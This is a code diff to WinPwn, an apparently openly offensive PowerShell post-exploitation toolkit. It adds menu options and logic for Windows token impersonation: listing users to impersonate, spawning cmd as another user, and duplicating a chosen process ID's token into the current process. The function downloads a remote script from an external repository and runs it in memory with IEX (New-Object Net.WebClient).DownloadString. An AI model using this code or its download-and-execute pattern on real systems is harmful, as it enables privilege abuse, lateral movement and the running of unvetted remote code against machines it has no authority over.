@@ -3943,8 +3943,12 @@ __        ___       ____
             Write-Host -ForegroundColor Green '1. List possible users to impersonate and enumerate via Windows API (slow, stealthier)!'
             Write-Host -ForegroundColor Green '2. List possible users to impersonate via WMI (fast, less stealthy)! '
             Write-Host -ForegroundColor Green '3. Spawn a new cmd as another user! '
-            Write-Host -ForegroundColor Green '4. Impersonate another user in this process! '
-            Write-Host -ForegroundColor Green '5. Go back '
+            Write-Host -ForegroundColor Green '4. Duplicate another users Token and set it for this process! '
+            Write-Host -ForegroundColor Green '5. Same as (3) but use WMI for enumeration (DInvoke enumeration causes some problems on eg WS2012 or older Systems, WMI should still work)! '
+            Write-Host -ForegroundColor Green '6. Same as (4) but use WMI for enumeration! '
+            Write-Host -ForegroundColor Green '7. Spawn a new cmd as another user and impersonate a given Process-ID! '
+            Write-Host -ForegroundColor Green '8. Duplicate a given Process-ID Token and set it for this process! '
+            Write-Host -ForegroundColor Green '9. Go back '
             Write-Host "================ WinPwn ================"
             $masterquestion = Read-Host -Prompt 'Please choose wisely, master:'
             
@@ -3954,9 +3958,13 @@ __        ___       ____
                 2{SharpImpersonation -listwmi}
                 3{SharpImpersonation}
                 4{SharpImpersonation -CurrentThread}
+                5{SharpImpersonation -wmi}
+                6{SharpImpersonation -wmi -CurrentThread}
+                7{$procID = Read-Host -Prompt 'Please enter the target Process ID to impersonate:';SharpImpersonation -procID $procID}
+                8{$procID = Read-Host -Prompt 'Please enter the target Process ID to impersonate:';SharpImpersonation -procID $procID -CurrentThread}
             }
         }
-        While ($masterquestion -ne 5)
+        While ($masterquestion -ne 9)
         
         }
         else
@@ -3983,15 +3991,20 @@ function SharpImpersonation
         [Switch]
         $listwmi,
         [Switch]
+        $wmi,
+        [Switch]
         $CurrentThread,
         [string]
-        $username = ""
+        $username = "",
+        [string]
+        $procID = ""
     )
 
 if (isadmin)
 {
 
 IEX (New-Object Net.WebClient).DownloadString($S3cur3Th1sSh1t_repo + '/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpImpersonationNoSpace.ps1')
+
 
 if ($list)
 {
@@ -4004,19 +4017,36 @@ elseif($listwmi)
     return
 }
 
+if ($procID -cne "")
+{
+    if ($CurrentThread)
+    {
+        Invoke-SharpImpersonation -Command "pid:$procID#technique:ImpersonateLoggedOnuser"
+    }
+    else
+    {
+        Invoke-SharpImpersonation -Command "pid:$procID"
+    }
+    return
+}
+
 if($username -eq "")
 {
     $username = Read-Host -Prompt 'Please enter the username to impersonate:'
 }
 
+$parameters = "user:$username"
+if($wmi)
+{
+    $parameters += "#wmi"
+}
 if ($CurrentThread)
 {
-    Invoke-SharpImpersonation -Command "user:$username#technique:ImpersonateLoggedOnuser"
+    $parameters += "#technique:ImpersonateLoggedOnuser"
 }
-else
-{
-    Invoke-SharpImpersonation -Command "user:$username#technique:ImpersonateLoggedOnuser"
-}
+Write-Host "Using parameters $parameters"
+Invoke-SharpImpersonation -Command "$parameters"
+
 
 }
 else
